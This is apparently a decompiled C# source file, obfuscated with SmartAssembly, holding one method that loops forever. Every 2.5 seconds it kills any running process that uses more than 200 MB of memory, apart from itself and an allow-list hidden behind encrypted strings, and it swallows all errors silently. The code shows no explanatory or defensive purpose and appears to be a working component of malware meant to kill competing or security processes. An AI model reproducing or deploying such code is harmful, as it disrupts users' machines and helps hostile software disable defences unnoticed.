using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wmzoZRdMaf;

public static class aECIkZoWMvdiXg
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void HAVsrHXFHlE()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107402309)) && !process.ProcessName.Contains(getString_0(107402332)) && !process.ProcessName.Contains(getString_0(107402291)) && !process.ProcessName.Contains(getString_0(107402282)) && !process.ProcessName.Contains(getString_0(107402301)) && !process.ProcessName.Contains(getString_0(107402256)) && !process.ProcessName.Contains(getString_0(107402275)) && !process.ProcessName.Contains(getString_0(107402262)) && !process.ProcessName.Contains(getString_0(107402217)) && !process.ProcessName.Contains(getString_0(107402236)) && !process.ProcessName.Contains(getString_0(107401671)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static aECIkZoWMvdiXg()
	{
		Strings.CreateGetStringDelegate(typeof(aECIkZoWMvdiXg));
	}
}
